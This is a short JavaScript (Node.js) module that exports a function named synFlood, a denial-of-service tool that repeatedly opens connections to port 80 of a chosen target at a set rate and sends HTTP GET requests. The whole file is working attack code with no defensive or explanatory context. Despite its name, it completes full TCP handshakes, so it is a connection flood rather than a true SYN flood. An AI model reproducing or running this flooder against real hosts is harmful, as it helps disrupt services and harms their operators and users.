const net = require('net');

function synFlood(target, rateLimit) {
    setInterval(() => {
        const client = new net.Socket();
        client.connect(80, target, () => {
            client.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
        });

        client.on('data', (data) => {
            console.log('Received: ' + data);
            client.destroy();
        });

        client.on('close', () => {
            console.log('Connection closed');
        });

        client.on('error', (err) => {
            console.error('Error: ' + err.message);
        });
    }, 1000 / rateLimit);
}

module.exports = synFlood;
